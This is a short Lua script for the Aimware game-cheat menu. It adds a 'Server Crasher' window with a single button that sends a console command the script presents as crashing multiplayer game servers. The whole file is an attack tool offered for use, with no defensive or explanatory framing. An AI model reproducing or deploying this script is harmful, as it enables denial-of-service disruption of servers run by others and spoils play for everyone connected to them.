local references = {
    aimware = gui.Reference("MENU"),
};
local windowW, windowH = 200, 100;
local window = gui.Window("lynx_server_crasher" .. "tabs", "Server Crasher", 100, 150, windowW, windowH);
gui.Button(window, "Crash server", function()
    client.Command("survival_equip spawn_equip_healthshot", true);
end)

callbacks.Register("Draw", function()
    window:SetActive(references.aimware:IsActive());
end);
